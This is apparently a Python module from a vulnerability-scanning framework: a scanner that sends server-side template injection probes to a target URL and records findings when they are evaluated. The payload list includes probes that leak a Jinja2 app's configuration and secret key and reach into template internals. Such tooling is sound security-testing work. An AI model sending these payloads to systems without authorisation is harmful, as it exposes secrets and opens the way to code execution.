from typing import Optional

from .base import BaseScanner
from .registry import register_scanner
from core.models import ScanTarget, Endpoint, Finding, ScannerManifest


SSTI_PAYLOADS = [
    ("{{7*7}}", "49", "jinja2"),
    ("${7*7}", "49", "freemarker"),
    ("${{7*7}}", "49", "velocity"),
    ("{{7*'7'}}", "7777777", "jinja2"),
    ("#{7*7}", "49", "ruby"),
    ("*{7*7}", "49", "el"),
    ("{{config}}", "SECRET_KEY", "jinja2"),
    ("{{self._TemplateReference__context}}", "cycler", "jinja2"),
    ("${7*7}", "49", "freemarker"),
]


@register_scanner(manifest=ScannerManifest(
    name="ssti_scanner",
    category="exploit",
    risk_level="moderate",
    estimated_cost=25,
    produces_tag_patterns=["ssti", "rce"],
))
class SSTIScanner(BaseScanner):
    @property
    def name(self) -> str:
        return "ssti_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list[Finding], list[Endpoint]]:
        findings: list[Finding] = []
        endpoints: list[Endpoint] = []

        for payload, indicator, engine in SSTI_PAYLOADS:
            try:
                resp = await self.request(
                    "GET", target.url,
                    params={"q": payload, "name": payload, "template": payload, "input": payload},
                )
                body = resp.text
                if indicator.lower() in body.lower():
                    findings.append(self.make_finding(
                        title=f"Server-Side Template Injection — {engine}",
                        description=f"Payload '{payload}' evaluated to '{indicator}' which appears in response.",
                        severity="critical",
                        endpoint=self.make_endpoint(target.url, discovered_by=self.name),
                        evidence={"payload": payload, "engine": engine,
                                  "indicator": indicator, "body_snippet": body[:200]},
                        confidence=0.85,
                        tags=["ssti", engine, "rce"],
                    ))
            except Exception:
                pass

        return findings, endpoints
